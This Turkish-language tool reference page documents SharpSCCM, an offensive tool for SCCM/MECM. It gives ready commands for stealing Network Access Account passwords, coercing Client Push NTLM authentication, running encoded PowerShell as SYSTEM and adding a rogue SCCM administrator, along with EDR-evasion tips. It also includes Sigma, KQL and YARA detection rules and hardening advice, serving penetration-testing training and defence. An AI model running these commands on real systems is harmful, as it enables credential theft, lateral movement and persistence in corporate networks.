# SharpSCCM

> **Kategori:** [10. KURUMSAL ALTYAPI, PAYLAŞIM VE VERİ AVI (ENTERPRISE DATA HUNTING)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Microsoft Endpoint Configuration Manager (SCCM/MECM) altyapısını WMI, SMS Provider ve HTTP/HTTPS yönetim noktaları (Management Point) üzerinden sorgulayan, Ağ Erişim Hesabı (NAA) kimlik bilgilerini çıkaran, birincil kullanıcı ilişkilerini (UDA) haritalandıran ve merkezi dağıtımlarla kod yürüten C# tabanlı post-exploitation aracı.

---

## 1. Genel Bakış ve Amaç

SharpSCCM, Chris Thompson (@Mayyhem / SpecterOps) tarafından geliştirilmiş, kurumsal Active Directory ortamlarında yaygın olarak kullanılan Microsoft Configuration Manager (SCCM / MECM) altyapısını denetlemek ve istismar etmek için tasarlanmış gelişmiş bir C# (.NET) aracıdır.

SCCM/MECM, kurumsal ağlardaki binlerce sunucu ve iş istasyonunu merkezi olarak yöneten, yazılım dağıtan, işletim sistemi kuran (OSD) ve güvenlik yamaları uygulayan son derece yetkili bir altyapıdır. SCCM istemcileri istemci makinelerde yerel `SYSTEM` yetkisiyle (`CcmExec.exe`) çalışır ve merkezi Yönetim Noktaları (Management Point - MP) ile iletişim kurar. 

SharpSCCM; standart etki alanı kullanıcılarının erişebildiği WMI ad alanlarını (`root\ccm`, `root\sms`), HTTP/HTTPS yönetim uç noktalarını ve Active Directory nesnelerini (`System Management` konteyneri) kullanarak ortamdaki SCCM sitelerini keşfeder. Aracın en yıkıcı yetenekleri arasında:
1. **Ağ Erişim Hesabı (Network Access Account - NAA) Çalma:** İstemcilerin etki alanına dahil olmadan dağıtım noktalarından (DP) yazılım indirebilmesi için yapılandırılan ve çoğunlukla açık/tersine çevrilebilir şekilde WMI politikalarında saklanan etki alanı hesaplarının parolasını çözme.
2. **Kullanıcı-Cihaz İlişkisi (User Device Affinity - UDA):** Hangi yüksek yetkili yöneticilerin hangi iş istasyonlarını birincil olarak kullandığını tespit etme.
3. **Client Push Installation Zorlama:** SCCM'in yeni makineleri yönetime katmak için kullandığı ve çoğunlukla `Domain Admins` üyesi olan servis hesabını NTLM coercion ile ele geçirme.
4. **Merkezi Kod Yürütme (CMPivot & Run Scripts):** SMS Provider ve WMI yöntemlerini kullanarak yönetilen kurumsal makinelerde anında `SYSTEM` yetkisiyle kod koşturma.

```
+-------------------------------------------------------------------------+
|                        SharpSCCM Mimari Akışı                           |
+-------------------------------------------------------------------------+
                               |
               1. AD Query: "CN=System Management,CN=System,DC=..."
               [mSSMSManagementPoint / mSSMSSite]
                               v
                +------------------------------+
                | Active Directory DC          |
                +------------------------------+
                               | Site Code / MP Bilgisi
                               v
                     +--------------------+
                     |   SharpSCCM Core   |
                     +--------------------+
                       /        |        \
        WMI / DCOM    /         |         \  HTTP / HTTPS
        (root\sms)   /          |          \ (CCM_POST / BITS)
                    v           v           v
           +-------------+ +-------------+ +-------------+
           | SMS Provider| | Management  | | Client Host |
           | (Site Server| | Point (MP)  | | (Local WMI) |
           +-------------+ +-------------+ +-------------+
                    |           |           |
                    |           |           +-> WMI ActualConfig (NAA Secrets)
                    |           +-> Policy Request (CCM_NetworkAccessAccount)
                    +-> Deploy Application / CMPivot Script
                                |
                                v
         +---------------------------------------------+
         |             Operasyonel Sonuç               |
         |  [!] NAA Domain Credentials (Cleartext)     |
         |  [!] Remote Code Execution as SYSTEM        |
         |  [!] Client Push Coercion to NTLM Relay     |
         +---------------------------------------------+
```

### 1.1 SCCM / MECM Temel Bileşenleri
* **Site Server (Merkezi Sunucu):** SCCM hiyerarşisini ve SQL Server veritabanını (`CM_<SiteCode>`) barındıran sunucu.
* **Management Point (MP):** İstemcilerin ilk başvurduğu, ilke (policy) indirdiği ve durum raporladığı HTTP/HTTPS web servisi.
* **Distribution Point (DP):** Paketlerin, yazılımların ve işletim sistemi imajlarının depolandığı SMB/HTTP içerik sunucusu.
* **SMS Provider:** SCCM veritabanına WMI üzerinden (`root\sms\site_<SiteCode>`) erişim sağlayan köprü servis.

### 1.2 SCCM Hücum Yüzeyi ve İstismar Yolları (Attack Surface & Abuse Vectors)
Kurumsal Active Directory ortamlarında SCCM altyapısı aşağıdaki dört ana vektör üzerinden sömürülebilir:
* **Network Access Account (NAA) Hırsızlığı:** Dağıtım Noktalarından içerik indirmek üzere yapılandırılan NAA hesapları, istemci makinelerin WMI ilke depolarında (`CCM_NetworkAccessAccount`) simetrik veya DPAPI şifreli olarak saklanır. SharpSCCM, yerel makinede veya Management Point üzerinde HTTP üzerinden bu politikaları çekip deşifre eder.
* **Client Push Installation Zorlaması:** SCCM Site Server, yeni bilgisayarlara istemci kurmak için yapılandırılan "Client Push" hesabını kullanır. Bu hesap çoğu zaman etki alanı genelinde yerel yönetici veya Domain Admin yetkisine sahiptir. Saldırgan sahte bir bilgisayar nesnesi açıp Client Push tetiklediğinde, SCCM sunucusu bu hesabı saldırganın dinleyicisine NTLM kimlik doğrulamasına zorlar.
* **Kullanıcı Cihaz İlişkisi (User Device Affinity - UDA):** SCCM hangi kullanıcının hangi cihazı birincil olarak kullandığını takip eder. Saldırgan bu veriyi sorgulayarak Domain Admin veya Kurumsal Yönetici hesaplarının oturum açtığı iş istasyonlarını noktasal olarak hedefler.
* **Yazılım Dağıtımı ve CMPivot ile Kod Yürütme:** SCCM yöneticisi hakkı elde edildiğinde; `Run Scripts`, `CMPivot` veya `Application Deployment` mekanizmaları üzerinden tüm kuruluş bilgisayarlarında anında `NT AUTHORITY\SYSTEM` yetkisinde kod yürütülebilir.

### Neden Önemli?

| Senaryo / İhtiyaç | Operasyonel Açıklama |
|---|---|
| **Açık Parola Elde Etme (NAA)** | Düşük yetkili bir etki alanı hesabıyla veya yerel makineden SCCM politikalarını çekerek NAA hesabının açık metin parolasını kurtarma. |
| **Yüksek Yetkili Hesap Yakalama (Client Push)** | Sahte veya yeni bir bilgisayar hesabı açarak SCCM sunucusunun Client Push hesabını SMB/HTTP üzerinden saldırgana doğrulamaya zorlama. |
| **Ağ Genelinde Kod Yürütme** | SCCM yöneticisi yetkisi ele geçirildiğinde CMPivot, Run Scripts veya Application Deployment ile tüm şirket makinelerinde `SYSTEM` olarak kod yürütme. |
| **Hedefli Yönetici Tespiti (UDA)** | Etki alanı yöneticilerinin kullandığı bilgisayarları tespit ederek hedefe yönelik kimlik avı veya yanal hareket rotası çizme. |

### Alternatif Araçlarla Karşılaştırma

| Özellik / Boyut | SharpSCCM | MalSCCM | PowerSCCM | SCCMHunter |
|---|---|---|---|---|
| **Geliştirme Dili** | C# (.NET) | C# (.NET) | PowerShell | Python |
| **NAA Parola Çözme** | Evet (Yerel WMI & Uzak MP) | Sınırlı | Evet | Evet |
| **C2 Bellek İçi Çalıştırma** | Mükemmel (`execute-assembly`)| Mükemmel | Script Block / AMSI riski | Linux / Uzaktan |
| **UDA & Keşif Kapsamı** | Çok Yüksek (WMI/AD/MP) | Düşük (Yürütme odaklı) | Orta | Yüksek |
| **Deployment / Sömürü** | Kapsamlı | Kapsamlı | Temel | Kapsamlı |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

SharpSCCM, eylem tabanlı (action-based) bir alt komut yapısı kullanır. Komutlar keşif (`get`), sömürü (`invoke`), yönetim (`add`/`remove`) ve manipülasyon olarak sınıflandırılmıştır.

### Genel Sözdizimi
```cmd
SharpSCCM.exe <alt_komut> [Seçenekler]
```

### Kritik Alt Komutlar ve Parametreler Tablosu

| Alt Komut / Parametre | Bayrak | Açıklama | Örnek Değer |
|---|---|---|---|
| `get class-instances` | `-p`, `--property` | SMS Provider veya istemcideki WMI sınıf örneklerini listeler. | `get class-instances SMS_R_System` |
| `get primary-user` | `-u`, `--user` | Belirtilen kullanıcının birincil cihazlarını (UDA) listeler. | `get primary-user -u admin_jdoe` |
| `get site-push-settings`| *Parametresiz* | Client Push hesap ayarlarını ve etkin durumunu sorgular. | `get site-push-settings` |
| `local get-naa` | *Parametresiz* | Yerel makinedeki WMI politikalarından NAA kimlik bilgilerini çözer. | `local get-naa` |
| `remote get-naa` | `-mp`, `--management-point` | Yönetim Noktasına anonim veya kimlikli istek atarak NAA parolasını çeker. | `remote get-naa -mp mp01.corp.local` |
| `invoke client-push` | `-t`, `--target` | Belirtilen hedefe doğru Client Push kurulumunu tetikler (NTLM coercion). | `-t \\10.0.0.5\share` |
| `exec` | `-d`, `--device` | Hedef cihaz üzerinde CMPivot veya Script ile komut koşturur. | `exec -d WS01 -c "whoami"` |
| `add admin` | `-u`, `--user` | Mevcut SCCM ortamına yeni bir Full Administrator hesabı ekler. | `add admin -u CORP\jdoe` |
| *Genel Parametre* | `-sc`, `--site-code` | Otomatik bulunamadığında 3 karakterli SCCM Site Kodunu zorlar. | `-sc PS1` |
| *Genel Parametre* | `-s`, `--server` | SMS Provider veya Site Server FQDN/IP adresi. | `-s sccm01.corp.local` |
| *Genel Parametre* | `-c`, `--command` | `exec` alt komutu ile hedef makinede yürütülecek komut dizesi. | `-c "cmd.exe /c whoami"` |
| *Genel Parametre* | `-api`, `--admin-service` | Site Server üzerindeki AdminService REST API adresi. | `-api https://sccm01/AdminService/v1.0/` |
| *Genel Parametre* | `--debug` | Ayrıntılı WMI sorgu ve hata ayıklama mesajlarını ekrana basar. | *Argümansız bayrak* |

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Yerel Makineden Network Access Account (NAA) Parolasını Çıkarma
Ele geçirilen bir etki alanı istemcisinde yönetici yetkisiyle yerel WMI ilkelerini okuyarak NAA etki alanı kullanıcısının parolasını deşifre etme.

```cmd
SharpSCCM.exe local get-naa
```

**Örnek Konsol Çıktısı:**
```text
[+] SharpSCCM 1.0.0 - A post-exploitation tool for SCCM
[*] Querying local WMI namespace: root\ccm\policy\machine\actualconfig
[*] Found CCM_NetworkAccessAccount policy instance!
[+] Successfully extracted encrypted policy secret.
[+] Decrypting credentials using DPAPI/Local System context...
--------------------------------------------------------------------
[+] Domain      : CORP
[+] Username    : svc_sccm_naa
[+] Password    : Summer2026SecureNetworkPass!
--------------------------------------------------------------------
[*] Validating credentials against Domain Controller (DC01.corp.local)...
[+] Credential validation SUCCESSFUL! User is active in Active Directory.
```

### Senaryo 2: Yönetim Noktası (MP) Üzerinden Uzaktan NAA Çekme
Yerel yönetici olmadan, düşük yetkili bir etki alanı hesabıyla doğrudan Management Point'e HTTP ilke isteği göndererek NAA parolasını elde etme.

```cmd
SharpSCCM.exe remote get-naa -mp mp01.corp.local -sc PS1
```

### Senaryo 3: Birincil Kullanıcı İlişkilerini (User Device Affinity) Haritalama
Etki alanı yöneticilerinin (`Domain Admins`) hangi bilgisayarlarda oturum açtığını belirleyerek hedefli yanal hareket rotası çıkarma.

```cmd
SharpSCCM.exe get primary-user -u "CORP\da_smith"
```

### Senaryo 4: Client Push Hesabını Zorlayarak NTLM Relay Yakalama
SCCM'i hedef sahte makineye (`10.0.0.5`) Client Push kurulumu yapmaya zorlayarak yüksek yetkili kurulum hesabının NTLM hash'ini çekme.

```cmd
SharpSCCM.exe invoke client-push -t 10.0.0.5 -sc PS1
```

### Senaryo 5: Cobalt Strike execute-assembly ile Bellek İçi Keşif
Diske dokunmadan SCCM site hiyerarşisini ve dağıtım noktalarını sorgulama.

```text
beacon> execute-assembly /opt/tools/SharpSCCM.exe get site-info
```

### Senaryo 6: Hedef Bilgisayarda SYSTEM Olarak Komut Yürütme (CMPivot / Run Scripts)
Yetkili bir SCCM operatörü bağlamında CMPivot özelliğini kullanarak hedef sunucuda işletim sistemi komutu çalıştırma.

```cmd
SharpSCCM.exe exec -d SRV-APP01.corp.local -c "powershell -enc JABjAGwAaQ..."
```

### Senaryo 7: Task Sequence Değişkenleri ve OSD Domain Join Parolalarını Çıkarma
İşletim sistemi dağıtımında (OSD) istemcileri etki alanına katmak için tanımlanan `OSDJoinPassword` ve diğer gizli Task Sequence değişkenlerini SMS Provider üzerinden sorgulama.

```cmd
SharpSCCM.exe get secrets -t "Windows 11 Enterprise Deployment"
```

### Senaryo 8: AdminService REST API Üzerinden Doğrudan İstemci Sorgulama
WMI veya DCOM engellendiğinde, Site Server'ın TCP 443 portunda dinleyen AdminService REST arayüzü üzerinden JSON tabanlı cihaz sorgusu yürütme.

```cmd
SharpSCCM.exe get-devices -api https://sccm01.corp.local/AdminService/v1.0/
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|---|---|---|
| `Failed to query WMI namespace root\ccm: Access is denied.` | Yerel WMI ad alanını okumak için gereken `Administrator` veya `SYSTEM` yetkisi eksik. | `local get-naa` komutu için yerel yöneticiye yükselin veya doğrudan `-mp` ile `remote get-naa` kullanın. |
| `HTTP 401 Unauthorized from Management Point.` | MP sunucusu Windows kimlik doğrulaması veya istemci PKI sertifikası (EHTTP/HTTPS) zorunlu kılıyor. | Geçerli etki alanı kimlik bilgisi belirtin veya makine sertifikasını dışa aktarıp isteğe ekleyin. |
| `No Network Access Account found in policies.` | Kuruluş Enhanced HTTP (EHTTP) kullanıyor veya NAA yapılandırmasını kaldırmış. | Ortamda NAA kullanılmıyorsa Client Push veya Site Takeover vektörlerine yönelin. |
| `SMS Provider WMI connection failed: Generic failure (0x80041001)` | SMS Provider sunucusuna RPC/WMI bağlantısı güvenlik duvarı veya DCOM kısıtlamalarıyla engelleniyor. | TCP 135 ve DCOM dinamik port erişimlerini kontrol edin; Site Server IP'sini açıkça belirtin. |
| `Site code could not be determined automatically.` | Active Directory `System Management` konteyneri izinleri kısıtlanmış veya DNS kayıtları eksik. | `-sc <SITE_CODE>` parametresi ile 3 karakterli site kodunu (`PS1`, `PRI` vb.) manuel sağlayın. |
| `Client Push execution failed: Target computer not found in AD.` | Hedef IP veya FQDN Active Directory veritabanında bir bilgisayar nesnesine karşılık gelmiyor. | `impacket-addcomputer` veya PowerMad ile önce hedef için bir kukla bilgisayar nesnesi oluşturun. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

SharpSCCM'in çalıştırılması, meşru yönetim trafiğini taklit etse de belirli anomali noktaları EDR ve SIEM korelasyonlarında yakalanabilir.

```
[SharpSCCM Yürütmesi]
          │
          ├──> AD System Management Sorgusu ────> Event ID 1644 (AD Recon)
          │
          ├──> WMI root\ccm Sorgulaması ─────────> Event ID 5861 / Sysmon ID 19,20,21
          │
          ├──> HTTP MP Policy Request ───────────> IIS W3C Logs (CCM_POST / CCM_GET)
          │
          └──> Client Push Tetikleme ────────────> Event ID 4624 (Logon Type 3 from SCCM)
                                                  Event ID 5140 (Share Accessed: ADMIN$)
```

### 5.1 Bırakılan İzler ve Olay Günlükleri
* **Windows Security Event ID 4624 (Logon Type 3):** SCCM Site Server tarafından hedef istemciye Client Push tetiklendiğinde hedefte `ADMIN$` oturumu açılır.
* **WMI Activity Logs (Microsoft-Windows-WMI-Activity/Operational - Event ID 5861):** `root\ccm\policy\machine\actualconfig` sorgulamaları kaydedilir.
* **IIS W3C Günlükleri (Management Point Sunucusunda):** `CCM_POST /ccm_system/request` istekleri ve standart dışı User-Agent kullanımı loglanır.
* **SMS Provider Denetim Günlükleri:** `SMS_Admin` veya `SMS_Site` nesnelerinde yapılan değişiklikler SCCM konsolunda denetim kaydı oluşturur.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
|---|---|---|---|
| **Discovery** | [T1082](https://attack.mitre.org/techniques/T1082/) | System Information Discovery | SCCM site hiyerarşisi ve yönetim noktalarının tespiti. |
| **Credential Access** | [T1552.001](https://attack.mitre.org/techniques/T1552/001/) | Credentials in Files | WMI ilkelerinden NAA açık metin parolasının çıkarılması. |
| **Execution** | [T1047](https://attack.mitre.org/techniques/T1047/) | Windows Management Instrumentation | WMI ve SMS Provider üzerinden yönetimsel sorgular. |
| **Lateral Movement** | [T1072](https://attack.mitre.org/techniques/T1072/) | Software Deployment Tools | SCCM yazılım dağıtımı ve CMPivot ile yanal hareket. |

### 5.3 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Teknik Sebebi | Azaltma / Önlem Stratejisi |
|---|---|---|
| **WMI İlke Okuma İzi** | `local get-naa` çağrısının EDR WMI sensörleri tarafından incelenmesi. | Bellek içi doğrudan dosya okuma yerine MP üzerinden HTTP ilke isteği (`remote get-naa`) tercih edin. |
| **Anormal Client Push İsteği** | Ağda bilinmeyen bir IP'ye doğru SCCM sunucusundan `ADMIN$` bağlantısı gitmesi. | Client Push tetiklerken saldırgan makinesi yerine etki alanında zaten kayıtlı bir pivot makine kullanın. |
| **Statik Binary İmzası** | `SharpSCCM.exe` derleme çıktısının bilinen AV/EDR imzalarına yakalanması. | Assembly obfuscation uygulayın veya C2 `execute-assembly` ile doğrudan bellekten yürütün. |

### 5.4 Tespit Kuralları

#### Sigma Kuralı (SCCM NAA Extraction via WMI Query)
```yaml
title: Potential SCCM NAA Password Extraction via WMI
id: b2a1c4d3-7890-4321-ba98-fedcba123456
status: experimental
description: root\ccm\policy\machine\actualconfig ad alanından CCM_NetworkAccessAccount sınıfının sorgulandığı tespit edildi.
logsource:
  product: windows
  service: wmi-activity
detection:
  selection:
    EventID: 5861
    Query|contains: 'CCM_NetworkAccessAccount'
  condition: selection
falsepositives:
  - SCCM İstemci Servisi (CcmExec.exe) meşru ilke yenileme işlemleri
level: high
```

#### Microsoft Sentinel KQL Sorgusu
```kql
WmiActivityEvent
| where EventId == 5861
| where Query contains "CCM_NetworkAccessAccount" or Query contains "SMS_R_System"
| extend ClientProcess = tostring(ClientMachine)
| project TimeGenerated, ClientProcess, Query, User
| order by TimeGenerated desc
```

#### YARA Kuralı
```yara
rule SharpSCCM_Assembly_Detection {
    meta:
        description = "SharpSCCM C# post-exploitation aracı tespiti"
        author = "Antigravity Active Directory Project"
        date = "2026-10-14"
        reference = "https://github.com/Mayyhem/SharpSCCM"
    strings:
        $s1 = "SharpSCCM" ascii wide nocase
        $s2 = "CCM_NetworkAccessAccount" ascii wide
        $s3 = "get-naa" ascii wide
        $s4 = "site-push-settings" ascii wide
        $s5 = "primary-user" ascii wide
    condition:
        uint16(0) == 0x5A4D and 3 of ($s*)
}
```

### 5.5 Savunma Karşılığı ve Sertleştirme (Hardening)
* **Enhanced HTTP (EHTTP) ve PKI Sertifikalarına Geçiş:** SCCM ortamında NAA kullanımı tamamen terk edilmeli; istemci iletişimi için Microsoft Entra ID veya Active Directory Certificate Services (AD CS) PKI sertifikaları zorunlu tutulmalıdır.
* **Client Push Hesabının Sınırlandırılması:** Client Push hesaplarına asla `Domain Admins` yetkisi verilmemeli; yalnızca hedeflenen yerel makinede yerel yönetici hakkı olan izole hesaplar atanmalıdır.
* **Network Access Account En Az Yetki Prensibi:** Eğer NAA kullanımı zorunluysa, bu hesaba etki alanında hiçbir özel yetki (Grup üyeliği, yerel admin vb.) verilmemeli, sadece DP paylaşımlarını okuma hakkı tanınmalıdır.
* **WMI ve DCOM Erişim Denetimi:** SMS Provider barındıran sunucularda WMI uzaktan erişim hakları sıkılaştırılmalı, yalnızca yetkili SCCM yöneticilerine DCOM Remote Access izni verilmelidir.
* **PXE Şifreleme ve Şifre Yönetimi:** PXE önyükleme noktalarında şifresiz boot media kullanımından kaçınılmalı, WDS/PXE bağlantıları güçlü parolalarla korunmalı ve `boot.wim` içerisine hassas kimlik bilgileri gömülmemelidir.
* **SMB İmzalama ve NTLM Relay Koruması:** SCCM Site Server ve tüm dağıtım noktalarında SMB imzalama (`RequireSecuritySignature = 1`) zorunlu kılınmalı, Client Push tetiklendiğinde NTLM relay yapılabilmesi engellenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```cmd
# 1. Yerel Makineden NAA Parolası Çıkarma
SharpSCCM.exe local get-naa

# 2. Yönetim Noktası (MP) Üzerinden Uzaktan NAA Çekme
SharpSCCM.exe remote get-naa -mp mp01.corp.local -sc PS1

# 3. Belirli Bir Kullanıcının Birincil Cihazlarını Sorgulama (UDA)
SharpSCCM.exe get primary-user -u "CORP\admin_user"

# 4. SCCM Site Bilgilerini ve Yönetim Noktalarını Listeleme
SharpSCCM.exe get site-info

# 5. Client Push Kurulum Ayarlarını ve Hesaplarını Denetleme
SharpSCCM.exe get site-push-settings

# 6. Belirli Bir Hedefe Client Push Kurulumu Zorlama (Coercion)
SharpSCCM.exe invoke client-push -t 10.0.0.5 -sc PS1

# 7. SMS Provider Üzerinden Tüm Yönetilen Cihazları Listeleme
SharpSCCM.exe get class-instances SMS_R_System -p Name,IPAddresses

# 8. CMPivot Kullanarak Hedef Cihazda Komut Çalıştırma
SharpSCCM.exe exec -d WS-FINANCE01 -c "whoami /all"

# 9. SCCM'e Yeni Yönetici Hesabı Ekleme (Tam Yetki)
SharpSCCM.exe add admin -u "CORP\attacker_account"

# 10. Dağıtım Noktalarını (Distribution Points) Listeleme
SharpSCCM.exe get class-instances SMS_DistributionPointInfo -p ServerName
```

### Komut Detay Analizleri

#### 1. Yerel Makineden NAA Parolası Çıkarma
* **Ne Yapar?:** Yerel sistemdeki `root\ccm\policy\machine\actualconfig` WMI ad alanını sorgular ve şifrelenmiş NAA kimlik bilgilerini DPAPI ile çözerek ekrana basar.
* **Ne Zaman Kullanılır?:** Bir iş istasyonu veya sunucu ele geçirildiğinde, etki alanı düzeyinde geçerli bir servis hesabı parolası elde etmek için.
* **Parametreler:**
  * `local get-naa`: Yerel ilke deşifreleme alt komutu.

#### 2. Yönetim Noktası (MP) Üzerinden Uzaktan NAA Çekme
* **Ne Yapar?:** Yerel yönetici yetkisi gerektirmeden, doğrudan HTTP/HTTPS protokolüyle MP sunucusuna ilke isteği atarak NAA parolasını uzaktan çeker.
* **Ne Zaman Kullanılır?:** Standart bir etki alanı kullanıcısıyla sisteme bağlanıldığında yerel yetki yükseltme yapmadan kimlik bilgisi toplamak için.
* **Parametreler:**
  * `-mp mp01.corp.local`: Yönetim Noktası FQDN veya IP adresi.
  * `-sc PS1`: 3 haneli SCCM site kodu.

#### 3. Belirli Bir Kullanıcının Birincil Cihazlarını Sorgulama (UDA)
* **Ne Yapar?:** SMS Provider üzerinden User Device Affinity veritabanını tarayarak hedeflenen kullanıcının hangi makinelerin birincil kullanıcısı olduğunu tespit eder.
* **Ne Zaman Kullanılır?:** Belirli bir Domain Admin veya VIP kullanıcının kimlik bilgilerini bellekten (LSASS) çekmek için hangi makineye gidilmesi gerektiğini belirlerken.
* **Parametreler:**
  * `-u "CORP\admin_user"`: Hedef kullanıcı hesabı.

#### 4. SCCM Site Bilgilerini ve Yönetim Noktalarını Listeleme
* **Ne Yapar?:** Active Directory `CN=System Management` konteynerini ve WMI sağlayıcılarını sorgulayarak ortamdaki site kodlarını ve sunucu rollerini haritalandırır.
* **Ne Zaman Kullanılır?:** SCCM altyapısının genel topolojisini anlamak için ilk keşif aşamasında.
* **Parametreler:**
  * `get site-info`: Temel site keşif alt komutu.

#### 5. Client Push Kurulum Ayarlarını ve Hesaplarını Denetleme
* **Ne Yapar?:** SCCM'in yeni sistemleri otomatik olarak yönetime katmak için Client Push özelliğini kullanıp kullanmadığını ve hangi hesapların tanımlandığını listeler.
* **Ne Zaman Kullanılır?:** Client Push NTLM coercion saldırısının uygulanabilirliğini doğrulamak için.
* **Parametreler:**
  * `get site-push-settings`: İstemci kurulum ilke sorgusu.

#### 6. Belirli Bir Hedefe Client Push Kurulumu Zorlama (Coercion)
* **Ne Yapar?:** SCCM sunucusuna istek göndererek belirtilen hedef makineye (`10.0.0.5`) istemci kurulumu başlatmasını söyler; sunucu bu makineye bağlanırken kimlik bilgilerini ortaya saçar.
* **Ne Zaman Kullanılır?:** NTLM relay veya Responder dinleyicisi üzerinden SCCM servis hesabının kimlik doğrulamasını yakalamak için.
* **Parametreler:**
  * `-t 10.0.0.5`: Dinleyicinin kurulu olduğu hedef IP.
  * `-sc PS1`: Site kodu.

#### 7. SMS Provider Üzerinden Tüm Yönetilen Cihazları Listeleme
* **Ne Yapar?:** `SMS_R_System` WMI sınıfından tüm kurumsal istemcilerin adlarını ve IP adreslerini çeker.
* **Ne Zaman Kullanılır?:** Ağdaki tüm aktif iş istasyonlarının ve sunucuların en güncel envanterini toplamak için.
* **Parametreler:**
  * `-p Name,IPAddresses`: Yalnızca ilgilenilen WMI özniteliklerini filtreler.

#### 8. CMPivot Kullanarak Hedef Cihazda Komut Çalıştırma
* **Ne Yapar?:** SCCM'in hızlı sorgulama ve yürütme motoru CMPivot üzerinden hedef cihazda PowerShell veya sistem komutu koşturur.
* **Ne Zaman Kullanılır?:** SCCM yöneticisi yetkisi varken uzak sistemlerde yanal hareket gerçekleştirip `SYSTEM` kabuğu almak için.
* **Parametreler:**
  * `-d WS-FINANCE01`: Hedef bilgisayar adı.
  * `-c "whoami /all"`: Yürütülecek işletim sistemi komutu.

#### 9. SCCM'e Yeni Yönetici Hesabı Ekleme (Tam Yetki)
* **Ne Yapar?:** SMS Provider WMI arayüzüne yazma yaparak belirtilen kullanıcıya SCCM konsolunda "Full Administrator" rolü atar.
* **Ne Zaman Kullanılır?:** SCCM altyapısında kalıcılık (persistence) sağlamak için.
* **Parametreler:**
  * `-u "CORP\attacker_account"`: Yetkilendirilecek kullanıcı adı.

#### 10. Dağıtım Noktalarını (Distribution Points) Listeleme
* **Ne Yapar?:** Tüm paket depolarını ve içerik sunucularını listeler.
* **Ne Zaman Kullanılır?:** Yazılım paketleri veya PXE önyükleme imajları (`boot.wim`) barındıran sunucuları hedeflemek için.
* **Parametreler:**
  * `SMS_DistributionPointInfo`: Dağıtım noktası WMI sınıfı.

---

## Kaynaklar
* [SharpSCCM Resmi GitHub Deposu](https://github.com/Mayyhem/SharpSCCM)
* [SpecterOps Blog: Coercing NTLM Authentication from SCCM](https://posts.specterops.io/coercing-ntlm-authentication-from-sccm-e6e23ea8260a)
* [SpecterOps: Site Takeover and Post-Exploitation in SCCM](https://posts.specterops.io/)
* [Misconfiguration Manager: A collection of SCCM attack vectors and defenses](https://github.com/subat0mik/Misconfiguration-Manager)
* [MITRE ATT&CK: Software Deployment Tools (T1072)](https://attack.mitre.org/techniques/T1072/)
* [Microsoft Dokümantasyonu: Configuration Manager Architecture](https://learn.microsoft.com/en-us/mem/configmgr/core/plan-design/hierarchy/fundamentals-of-managing-content)

---

> **Önceki:** [← impacket-mssqlclient](./impacket-mssqlclient.md) · **Sonraki:** [MalSCCM →](./MalSCCM.md)
